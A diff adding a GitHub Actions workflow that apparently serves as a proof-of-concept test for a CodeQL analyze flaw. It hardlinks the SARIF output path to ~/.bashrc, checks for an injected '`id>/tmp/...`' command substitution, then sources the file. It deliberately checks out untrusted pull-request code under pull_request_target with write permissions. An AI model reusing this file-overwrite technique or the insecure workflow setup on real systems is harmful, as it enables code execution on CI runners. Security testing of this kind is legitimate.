@@ -1,0 +1,155 @@
+name: CodeQL analyze critical child link
+on:
+  pull_request_target:
+    types: [opened, synchronize, reopened]
+permissions:
+  actions: read
+  contents: write
+  security-events: write
+jobs:
+  analyze:
+    strategy:
+      fail-fast: false
+      max-parallel: 4
+      matrix:
+        include:
+          - case: regular
+            post_dir: lower-data/control-dir
+            link_class: regular
+          - case: safe-child-link
+            post_dir: lower-data/safe-dir
+            link_class: safe
+          - case: outside-child-link
+            post_dir: lower-data/post-dir
+            link_class: outside
+          - case: staged-hardlink
+            post_dir: lower-data/hard-dir
+            link_class: hardlink
+    name: analyze-${{ matrix.case }}
+    runs-on: ubuntu-latest
+    timeout-minutes: 8
+    steps:
+      - name: Checkout lower PR head as data only
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
+        with:
+          repository: ${{ github.event.pull_request.head.repo.full_name }}
+          ref: ${{ github.event.pull_request.head.sha }}
+          path: lower-data
+          persist-credentials: false
+          allow-unsafe-pr-checkout: true
+      - name: Owner protected shell target and preflight
+        shell: python
+        env:
+          CASE: ${{ matrix.case }}
+          LINK_CLASS: ${{ matrix.link_class }}
+          POST_DIR: ${{ matrix.post_dir }}
+        run: |
+          import hashlib, json, os, pathlib
+          home = pathlib.Path.home()
+          bashrc = home / ".bashrc"
+          marker = pathlib.Path("/tmp/cql-codeql-analyze-poc")
+          marker.unlink(missing_ok=True)
+          sentinel = ("# OWNER_BASHRC_SENTINEL_" + os.environ["CASE"] + "\n").encode()
+          bashrc.write_bytes(sentinel)
+          bashrc.chmod(0o600)
+          post = pathlib.Path(os.environ["POST_DIR"])
+          post.mkdir(parents=True, exist_ok=True)
+          child = post / "upload.sarif"
+          if os.environ["LINK_CLASS"] == "hardlink":
+              child.unlink(missing_ok=True)
+              os.link(bashrc, child)
+          projection = {
+              "case": os.environ["CASE"],
+              "post_dir_real_directory": post.is_dir() and not post.is_symlink(),
+              "child_exists": child.exists() or child.is_symlink(),
+              "child_is_symlink": child.is_symlink(),
+              "child_is_hardlink_to_bashrc": child.exists() and not child.is_symlink() and child.stat().st_ino == bashrc.stat().st_ino,
+              "bashrc_sha256": hashlib.sha256(sentinel).hexdigest(),
+              "marker_absent": not marker.exists(),
+          }
+          print("CQLA_PRE=" + json.dumps(projection, sort_keys=True, separators=(",", ":")))
+      - name: Initialize current CodeQL
+        id: init
+        continue-on-error: true
+        uses: github/codeql-action/init@33d7b85da1a04171e211befe2c739303b9a4c066
+        with:
+          languages: javascript-typescript
+          build-mode: none
+          source-root: lower-data
+          queries: +./lower-data/queries
+      - name: Init outcome projection
+        if: always()
+        shell: python
+        env:
+          CASE: ${{ matrix.case }}
+          INIT_OUTCOME: ${{ steps.init.outcome }}
+        run: |
+          import json, os
+          print("CQLA_INIT=" + json.dumps({"case": os.environ["CASE"], "init_outcome": os.environ.get("INIT_OUTCOME")}, sort_keys=True, separators=(",", ":")))
+      - name: Analyze into child-link destination
+        id: analyze
+        continue-on-error: true
+        uses: github/codeql-action/analyze@33d7b85da1a04171e211befe2c739303b9a4c066
+        with:
+          output: ${{ runner.temp }}/cql-safe-output
+          checkout_path: ${{ github.workspace }}/lower-data
+          post-processed-sarif-path: ${{ github.workspace }}/${{ matrix.post_dir }}
+          upload: never
+          upload-database: false
+          wait-for-processing: false
+      - name: Protected target readback before consumer
+        if: always()
+        shell: python
+        env:
+          CASE: ${{ matrix.case }}
+          ANALYZE_OUTCOME: ${{ steps.analyze.outcome }}
+        run: |
+          import hashlib, json, os, pathlib
+          bashrc = pathlib.Path.home() / ".bashrc"
+          raw = bashrc.read_bytes() if bashrc.is_file() else b""
+          marker = pathlib.Path("/tmp/cql-codeql-analyze-poc")
+          print("CQLA_POST=" + json.dumps({
+              "case": os.environ["CASE"],
+              "analyze_outcome": os.environ.get("ANALYZE_OUTCOME"),
+              "bashrc_is_file": bashrc.is_file(),
+              "bashrc_bytes": len(raw),
+              "bashrc_sha256": hashlib.sha256(raw).hexdigest(),
+              "contains_sarif_version": b'"version"' in raw and b'"runs"' in raw,
+              "contains_command_substitution": b'`id>/tmp/cql-codeql-analyze-poc`' in raw,
+              "marker_absent_before_consumer": not marker.exists(),
+          }, sort_keys=True, separators=(",", ":")))
+      - name: Fixed benign Bash consumer
+        if: always()
+        continue-on-error: true
+        shell: bash
+        run: |
+          marker="/tmp/cql-codeql-analyze-poc"
+          rm -f "$marker"
+          set +e
+          bash -n "$HOME/.bashrc" >"$RUNNER_TEMP/cql-bash-syntax.log" 2>&1
+          echo "$?" >"$RUNNER_TEMP/cql-bash-syntax.status"
+          bash --noprofile --rcfile "$HOME/.bashrc" -i -c true >"$RUNNER_TEMP/cql-bash-consumer.log" 2>&1
+          true
+      - name: Exact benign execution oracle
+        if: always()
+        shell: python
+        env:
+          CASE: ${{ matrix.case }}
+        run: |
+          import hashlib, json, os, pathlib, re
+          marker = pathlib.Path("/tmp/cql-codeql-analyze-poc")
+          raw = marker.read_bytes() if marker.is_file() else b""
+          root = pathlib.Path(os.environ["RUNNER_TEMP"])
+          syntax_raw = (root / "cql-bash-syntax.status").read_text().strip() if (root / "cql-bash-syntax.status").is_file() else ""
+          consumer = (root / "cql-bash-consumer.log").read_bytes() if (root / "cql-bash-consumer.log").is_file() else b""
+          print("CQLA_ORACLE=" + json.dumps({
+              "case": os.environ["CASE"],
+              "marker_present": marker.is_file(),
+              "marker_bytes": len(raw),
+              "marker_sha256": hashlib.sha256(raw).hexdigest() if raw else None,
+              "benign_id_shape": bool(re.match(rb'uid=[0-9]+\(', raw)),
+              "bash_syntax_status": int(syntax_raw) if syntax_raw.isdigit() else None,
+              "consumer_log_bytes": len(consumer),
+              "consumer_log_sha256": hashlib.sha256(consumer).hexdigest() if consumer else None,
+              "consumer_log_contains_id_shape": bool(re.search(rb'uid=[0-9]+\(', consumer)),
+          }, sort_keys=True, separators=(",", ":")))
